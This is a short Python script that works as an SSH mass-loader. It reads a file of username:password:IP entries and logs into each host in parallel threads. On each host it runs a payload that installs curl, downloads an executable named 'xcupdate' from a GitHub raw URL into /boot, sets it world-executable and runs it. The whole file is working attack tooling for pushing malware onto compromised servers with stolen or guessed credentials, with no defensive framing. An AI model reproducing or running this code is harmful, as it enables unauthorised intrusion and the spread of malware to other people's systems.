import sys
import paramiko
import threading


PAYLOAD = """cd /boot; apt-get update -y; apt-get install curl -y; rm xcupdate; curl -o xcupdate "https://raw.githubusercontent.com/rxu7s/XC/main/main"; chmod 777 xcupdate; ./xcupdate"""

def load(username, password, ip):
    sshobj = paramiko.SSHClient()
    sshobj.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        sshobj.connect(ip, username=username, password=password, port=22, look_for_keys=True, timeout=10)
        print("\x1b[32m[+]\x1b[0;37m Logged In -> " + ip + " " + username + ":" + password + "")
    except Exception as e:
        # paramiko raises SSHException('No authentication methods available',) since we did not specify any auth methods. socket stays open.
        print("\x1b[31m[-]\x1b[0;37m " + ip + " " + username + ":" + password + " >> Exception: "+str(e))
        return
    stdin, stdout, stderr = sshobj.exec_command(PAYLOAD)
    print("\x1b[1;33m[?]\x1b[0;37m Server output: "+"".join(stdout.readlines()).strip())
if not len(sys.argv) > 1:
    print("\x1b[31m[-]\x1b[0;37m " + sys.argv[0] + " <file to load>")
    exit(-1)
with open(sys.argv[1], "r") as file:
    for server in file:
        splitted = server.split(":")
        threading.Thread(target=load, args=(splitted[0], splitted[1], splitted[2])).start()

